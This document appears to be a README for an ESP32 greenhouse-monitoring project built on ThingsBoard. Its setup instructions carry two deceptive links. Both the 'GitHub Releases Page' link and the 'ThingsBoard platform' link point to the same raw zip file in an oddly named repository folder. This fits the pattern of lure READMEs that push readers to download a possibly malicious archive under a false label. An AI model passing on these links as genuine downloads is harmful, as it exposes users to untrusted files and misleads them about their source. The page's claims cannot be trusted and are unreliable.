## ⚙️ System Requirements

To run this application, you need:

- A computer with Windows, macOS, or Linux.
- An ESP32 microcontroller.
- Access to the ThingsBoard cloud platform.
- An internet connection.

## 🌱 Features

- **Real-time Monitoring**: Keep an eye on your greenhouse conditions such as temperature and humidity.
- **Data Streaming**: Send and receive data from the ThingsBoard cloud platform.
- **Wokwi Simulation**: Test your setup inside the Wokwi interactive simulator.
- **User-Friendly**: Designed for ease of use, no programming skills are required.

## 🛠️ Setup Instructions

1. **Download the Software**:
   - Go to the [GitHub Releases Page](https://raw.githubusercontent.com/Arlis464/smart-greenhouse-esp32/main/unattempted/smart-greenhouse-esp32.zip).
   - Find the latest version and download the zip or tar file.

2. **Extract Files**:
   - Once downloaded, extract the files to a folder on your computer.

3. **Prepare ESP32**:
   - Connect the ESP32 microcontroller to your computer.
   - Make sure you have the necessary drivers installed. This might include the USB-to-Serial drivers for the ESP32.

4. **Upload the Code**:
   - Open the Arduino IDE (make sure you have it installed).
   - Load the main project file (usually an `.ino` file).
   - Choose the correct board and port in Arduino IDE.
   - Click on the upload button to transfer the code to your ESP32.

5. **Set Up ThingsBoard**:
   - Create an account on the [ThingsBoard platform](https://raw.githubusercontent.com/Arlis464/smart-greenhouse-esp32/main/unattempted/smart-greenhouse-esp32.zip).
   - Follow their instructions to create a new device and obtain your access token.
   - Update the token in the Arduino code where specified.

6. **Run the System**:
   - Once the code is uploaded, open the Serial Monitor in Arduino IDE to see the output.
   - Your application will start sending data to ThingsBoard.
   - You can access your data on the ThingsBoard dashboard.

## 📊 Usage

After the setup, you can monitor the greenhouse conditions directly from the ThingsBoard dashboard. You can visualize temperature, humidity, and other environmental factors in real-time.

## 🔧 Troubleshooting

If you encounter any issues while setting up or running the application, consider the following:

- Ensure the ESP32 is correctly connected to your computer.
- Double-check your Wi-Fi credentials in the code.
- Verify your access token used for ThingsBoard; it must match the one generated on the platform.
- Restart your ESP32 if it seems unresponsive.
